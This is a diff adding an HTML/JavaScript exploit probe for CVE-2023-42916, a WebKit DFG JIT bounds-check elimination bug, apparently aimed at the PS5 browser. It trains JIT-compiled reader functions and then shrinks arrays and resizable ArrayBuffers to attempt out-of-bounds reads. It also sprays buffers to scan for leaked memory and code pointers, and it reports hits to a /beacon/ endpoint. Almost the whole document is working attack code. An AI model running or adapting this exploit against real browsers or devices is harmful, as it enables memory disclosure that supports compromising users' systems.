@@ -1,0 +1,242 @@
+<!--
+  p680: CVE-2023-42916 — DFG array bounds elimination OOB read
+
+  CVE-2023-42916: OOB read fixed with "improved input validation" in Safari 17.1.2.
+  Red Hat confirms it is JIT-related. PS5 has DFG JIT active (p602: 5M loop in 49ms).
+
+  Strategy: DFG optimizes array bounds checks away when it can prove the index is
+  always in range. If we train the DFG with in-bounds indices, then feed an
+  out-of-bounds index after compilation, the JIT code may skip the bounds check
+  and read past the array end.
+
+  The key is to trigger CheckBounds elimination in the DFG — this happens when:
+  1. The function is hot (called 100K+ times with in-bounds indices)
+  2. DFG sees a GetByVal with an index it can range-analyze as always < length
+  3. After DFG compilation, we change the array to be shorter (or use a larger index)
+
+  We test multiple trigger patterns:
+  A) Shrink array after DFG compilation (splice/length assignment)
+  B) Use valueOf callback to change array mid-access
+  C) TypedArray with resizable backing that shrinks between DFG and access
+  D) Sparse array where DFG assumes dense layout
+
+  Any OOB read that returns a non-zero value from a zeroed ArrayBuffer is a leak.
+
+  CRASH_CLASS: MODERATE (OOB read, may crash if hitting unmapped memory)
+  prior art: p602 (JIT detection), p604 (NaN confusion), p605 (type confusion),
+             p621 (CVE-2024-44308 DFG PutByVal), p608 series (ResizableArrayBuffer)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p680</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P680-START:CVE-2023-42916-DFG-BOUNDS-ELIM');
+  var results = [];
+
+  // === SECTION A: Train DFG then shrink array ===
+  b('A:TRAIN-THEN-SHRINK');
+  try {
+    var arr = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16];
+
+    // Hot function: DFG will see idx always < 16, may eliminate bounds check
+    function readAt(a, idx) {
+      return a[idx];
+    }
+
+    // Train with in-bounds reads — 200K iterations to force DFG
+    for (var i = 0; i < 200000; i++) {
+      readAt(arr, i & 15); // always 0-15, in bounds
+    }
+    b('A:TRAINED-200K');
+
+    // Now shrink the array
+    arr.length = 4;
+
+    // Try OOB read with DFG-compiled function
+    var oob = [];
+    for (var idx = 4; idx < 16; idx++) {
+      var val = readAt(arr, idx);
+      if (val !== undefined) {
+        oob.push(idx + ':' + val);
+      }
+    }
+    if (oob.length > 0) {
+      b('A:OOB-HIT:' + oob.join(','));
+      results.push('A:' + oob.join(','));
+    } else {
+      b('A:NO-OOB');
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: valueOf callback changes array during DFG access ===
+  b('B:VALUEOF-RACE');
+  try {
+    var arr2 = new Array(32);
+    for (var i = 0; i < 32; i++) arr2[i] = i + 100;
+
+    function readWithIndex(a, idxObj) {
+      return a[idxObj]; // DFG will call valueOf on idxObj
+    }
+
+    // Train with normal integer indices
+    for (var i = 0; i < 200000; i++) {
+      readWithIndex(arr2, i & 31);
+    }
+    b('B:TRAINED-200K');
+
+    // Now use an object with valueOf that shrinks the array
+    var triggered = false;
+    var poisonIdx = {
+      valueOf: function() {
+        if (!triggered) {
+          triggered = true;
+          arr2.length = 2; // shrink while DFG is mid-access
+        }
+        return 20; // out of bounds after shrink
+      }
+    };
+
+    var val2 = readWithIndex(arr2, poisonIdx);
+    if (val2 !== undefined) {
+      b('B:OOB-HIT:val=' + val2);
+      results.push('B:' + val2);
+    } else {
+      b('B:NO-OOB');
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: ResizableArrayBuffer shrink during DFG TypedArray read ===
+  b('C:RAB-SHRINK');
+  try {
+    if (typeof ArrayBuffer.prototype.resize === 'function') {
+      var rab = new ArrayBuffer(256, {maxByteLength: 256});
+      var view = new BigUint64Array(rab); // 32 elements
+
+      // Fill with known pattern
+      for (var i = 0; i < 32; i++) view[i] = BigInt(0xDEAD0000 + i);
+
+      function readTyped(v, idx) {
+        return v[idx];
+      }
+
+      // Train DFG: always read in bounds
+      for (var i = 0; i < 200000; i++) {
+        readTyped(view, i & 31);
+      }
+      b('C:TRAINED-200K');
+
+      // Shrink the buffer
+      rab.resize(32); // now only 4 BigUint64 elements
+
+      // Try to read past new end with DFG-compiled code
+      var oob3 = [];
+      for (var idx = 4; idx < 32; idx++) {
+        var val = readTyped(view, idx);
+        if (val !== undefined) {
+          oob3.push(idx + ':0x' + val.toString(16));
+        }
+      }
+      if (oob3.length > 0) {
+        b('C:OOB-HIT:' + oob3.slice(0, 5).join(','));
+        results.push('C:' + oob3.length + ' leaked');
+
+        // Check for code pointers (high addresses)
+        for (var j = 0; j < oob3.length; j++) {
+          var parts = oob3[j].split(':');
+          var hex = parts[1];
+          if (hex.length > 10 && !hex.startsWith('0xdead')) {
+            b('C:CODE-PTR?:' + oob3[j]);
+          }
+        }
+      } else {
+        b('C:NO-OOB');
+      }
+    } else {
+      b('C:SKIP-NO-RAB');
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Sparse array with DFG assuming dense ===
+  b('D:SPARSE-DENSE-CONFUSION');
+  try {
+    var dense = [];
+    for (var i = 0; i < 64; i++) dense[i] = i + 200;
+
+    function readDense(a, idx) {
+      return a[idx];
+    }
+
+    // Train DFG with dense array reads
+    for (var i = 0; i < 200000; i++) {
+      readDense(dense, i & 63);
+    }
+    b('D:TRAINED-200K');
+
+    // Convert to sparse by adding a far-out-of-range element, then delete it
+    // This may cause butterfly reallocation while DFG still uses old pointer
+    dense[100000] = 999;
+    delete dense[100000];
+    dense.length = 8; // now much shorter than DFG expects
+
+    var oob4 = [];
+    for (var idx = 8; idx < 64; idx++) {
+      var val = readDense(dense, idx);
+      if (val !== undefined) {
+        oob4.push(idx + ':' + val);
+      }
+    }
+    if (oob4.length > 0) {
+      b('D:OOB-HIT:' + oob4.slice(0, 5).join(','));
+      results.push('D:' + oob4.length + ' oob');
+    } else {
+      b('D:NO-OOB');
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: ArrayBuffer spray after OOB to catch leaked values ===
+  b('E:SPRAY-SCAN');
+  try {
+    // Allocate ArrayBuffers and scan for non-zero residue
+    var bufs = [];
+    for (var i = 0; i < 1024; i++) {
+      bufs.push(new ArrayBuffer(256));
+    }
+    var leaked = 0;
+    for (var i = 0; i < bufs.length; i++) {
+      var u64 = new BigUint64Array(bufs[i]);
+      for (var j = 0; j < u64.length; j++) {
+        if (u64[j] !== 0n) {
+          leaked++;
+          var hex = u64[j].toString(16);
+          if (hex.length >= 8) {
+            b('E:RESIDUE:buf=' + i + ',off=' + (j*8) + ',val=0x' + hex);
+          }
+        }
+      }
+    }
+    b('E:SPRAY-DONE:' + leaked + '-nonzero-of-' + (bufs.length * 32));
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SUMMARY ===
+  if (results.length > 0) {
+    b('P680-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P680-RESULT:NO-OOB-DETECTED');
+  }
+  b('P680-DONE');
+}
+
+setTimeout(main, 100);
+</script>
+</head><body><pre id="log">p680: CVE-2023-42916 DFG bounds elimination OOB read</pre></body></html>
